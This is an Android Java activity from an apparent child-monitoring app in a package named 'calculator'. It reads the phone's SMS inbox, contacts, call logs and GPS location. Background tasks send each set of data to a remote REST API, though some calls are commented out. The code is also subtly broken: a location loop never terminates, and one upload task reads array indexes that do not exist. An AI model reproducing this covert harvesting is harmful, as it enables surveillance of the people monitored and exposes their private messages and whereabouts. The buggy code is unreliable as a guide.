package com.child.calculator;

import android.Manifest;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

/**
 * Created by Nevon Dell on 4/7/2017.
 */

public class testActivity extends AppCompatActivity {

    TextView Call;
    SimpleDateFormat sdfd=new SimpleDateFormat("yyyy/MM/dd");
    SimpleDateFormat sdft=new SimpleDateFormat("HH:mm");
    SharedPreferences pref;
    String pid,cid;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Toast.makeText(getApplicationContext(),"Inside onCreate",Toast.LENGTH_LONG).show();
        setContentView(R.layout.test);
        pref=getSharedPreferences("childmonitor",Context.MODE_PRIVATE);
        pid = pref.getString("pid","");
        cid = pref.getString("cid","");

        Call = (TextView) findViewById(R.id.call);
//        getMessages();
//        getContacts(testActivity.this.getContentResolver());
//        getCallLogs(testActivity.this.getContentResolver());
//        getLocation();


    }



    public void getMessages(){

        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSMSURI, new String[]{"_id", "address", "date", "body"}, null, null,null);
        String sms = "";
        ArrayList<String> id=new ArrayList<String>();
        ArrayList<String> name=new ArrayList<String>();
        ArrayList<String>  date=new ArrayList<String>();
        ArrayList<String>  time=new ArrayList<String>();
        ArrayList<String>  body=new ArrayList<String>();
        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();

        while (cur.moveToNext())
        {
            id.add(cur.getString(0));
            name.add(cur.getString(1));
            String b=cur.getString(3);
            b=b.replaceAll("'","");
            b=b.replaceAll("\"","");
            body.add(b);
            String dt=cur.getString(2);
            Date d=new Date(Long.parseLong(dt));
            String fd=sdfd.format(d);
            String ft=sdft.format(d);

            date.add(fd);
            time.add(ft);
            Pid.add(pid);
            Cid.add(cid);
        }


        for (int i=0 ;i<name.size();i++){

            Call.setText(Call.getText().toString()+"\n"+name.get(i) + "\n" + body.get(i) +"\n"+date.get(i)+" \n"+time.get(i)+"\n"+Pid.get(i)+"\n"+Cid.get(i)+"\n\n\n");
        }

//          new getMessageTask().execute(Pid,Cid,name,body,date,time);

//        Toast.makeText(getApplicationContext(),Pid.size()+"",Toast.LENGTH_SHORT).show();

//        new getMessageTask().execute(Pid,Cid,name,body,date,time);

    }


    public class getMessageTask extends AsyncTask<ArrayList<String>,JSONObject,String>
    {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a="back";
            RestAPI api=new RestAPI();
            try {
                JSONObject json=api.addMessage(params[0],params[1],params[2],params[3],params[4],params[5]);
                JSONPARSE jp=new JSONPARSE();
                a=jp.parse(json);
            } catch (Exception e) {
                a=e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
                Toast.makeText(getApplicationContext(),s,Toast.LENGTH_LONG).show();
        }
    }


     public void getContacts(ContentResolver cr){

        Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);

        ArrayList<String> name = new ArrayList<String>();
        ArrayList<String> PhoneNumber=new ArrayList<String>();
        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();

        while (phones.moveToNext())
        {
            String n=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String p = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            n=n.replaceAll("'","");
            n=n.replaceAll("\"","");
            name.add(n);
            PhoneNumber.add(p);
            Pid.add(pid);
            Cid.add(cid);
        }
        phones.close();

         for (int i=0 ;i<name.size();i++){

             Call.setText(Call.getText().toString()+"\n"+name.get(i) + "\n" + PhoneNumber.get(i) +"\n\n\n");
         }
//        Toast.makeText(getApplicationContext(),name.size()+"",Toast.LENGTH_SHORT).show();
//         new getContactTask().execute(Pid,Cid,name,PhoneNumber);

    }


    public class getContactTask extends AsyncTask<ArrayList<String>,JSONObject,String>
    {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a="back";
            RestAPI api=new RestAPI();
            try {
                JSONObject json=api.addcontact(params[0],params[1],params[2],params[3]);
                JSONPARSE jp=new JSONPARSE();
                a=jp.parse(json);
            } catch (Exception e) {
                a=e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            Toast.makeText(getApplicationContext(),s,Toast.LENGTH_LONG).show();
        }
    }


    public void getCallLogs(ContentResolver cr){

        String strOrder = CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor curCallLogs = cr.query(callUri, null, null, null, strOrder);


         ArrayList<String> conNumbers= new ArrayList<String>();
         ArrayList<String> conTime= new ArrayList<String>();
         ArrayList<String> conDate= new ArrayList<String>();
         ArrayList<String> conType= new ArrayList<String>();
        ArrayList<String> conDuration = new ArrayList<String>();
        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();



        while (curCallLogs.moveToNext())
        {
            String callNumber = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.NUMBER));
            String duration = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.DURATION));
            String callDate = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy");

            String dateTime = callDate;
            Date d=new Date(Long.parseLong(dateTime));
            String finalDate = sdfd.format(d);
            String finalTime = sdft.format(d);

            String dateString = formatter.format(new Date(Long.parseLong(callDate)));
            String callType = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.TYPE));

            if(callType.equals("1")){
                conType.add("Incoming");
            }else if(callType.equals("2")){
                conType.add("Outgoing");
            }else {
                conType.add("Missed");

            }
            callNumber = callNumber.replaceAll("'","");
            callNumber = callNumber.replaceAll("\"","");
            conNumbers.add(callNumber);

            conDuration.add(duration);
            conDate.add(finalDate);
            conTime.add(finalTime);
            Pid.add(pid);
            Cid.add(cid);


        }

        for (int i=0 ;i<conNumbers.size();i++){

            Call.setText(Call.getText().toString()+"\n"+conNumbers.get(i) + "\n" + conTime.get(i) +"\n"+conDate.get(i)+" \n"+conType.get(i)+"\n"+conDuration.get(i)+" \n"+"\n\n\n");
        }


//        new getCallLogTask().execute(Pid,Cid,conNumbers,conType,conDate,conTime,conDuration);


    }


    public class getCallLogTask extends AsyncTask<ArrayList<String>,JSONObject,String>
    {


            @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a="back";
            RestAPI api=new RestAPI();
            try {
                JSONObject json=api.addlog(params[0],params[1],params[2],params[3],params[4],params[5],params[6]);
                JSONPARSE jp=new JSONPARSE();
                a=jp.parse(json);
            } catch (Exception e) {
                a=e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            Toast.makeText(getApplicationContext(),s,Toast.LENGTH_LONG).show();
        }
    }

    public void getLocation()
    {
        Toast.makeText(getApplicationContext(),"Inside getLocation",Toast.LENGTH_LONG).show();

        ArrayList<String> Pid=new ArrayList<String>();
        ArrayList<String> Cid=new ArrayList<String>();
        ArrayList<String> LatLng=new ArrayList<String>();

        try {
            GPS_Tracker gps_tracker = new GPS_Tracker(testActivity.this,testActivity.this);
        if (gps_tracker.canGetLocation())
        {
            double Lat = gps_tracker.getLatitude();
            double Lng = gps_tracker.getLongitude();

            Pid.add(pid);
            Cid.add(cid);
            LatLng.add(Lat+","+Lng);

            Toast.makeText(testActivity.this,Lat+" "+ Lng,Toast.LENGTH_LONG).show();

            while (Lat!=0 && Lng!=0)
            {

              new  getLocationTask().execute(Pid,Cid,LatLng);
            }
        }else {
            Toast.makeText(getApplicationContext(),"else",Toast.LENGTH_LONG).show();

        }
        }catch (Exception e){
            Toast.makeText(getApplicationContext(),e.getMessage(),Toast.LENGTH_LONG).show();
        }

    }

    public class getLocationTask extends AsyncTask<ArrayList<String>,JSONObject,String>
    {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }



            @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a="back";
            RestAPI api=new RestAPI();
            try {
                JSONObject json=api.addLocation(params[0],params[1],params[2],params[3],params[4]);
                JSONPARSE jp=new JSONPARSE();
                a=jp.parse(json);
            } catch (Exception e) {
                a=e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            Toast.makeText(getApplicationContext(),s,Toast.LENGTH_LONG).show();
        }
    }





}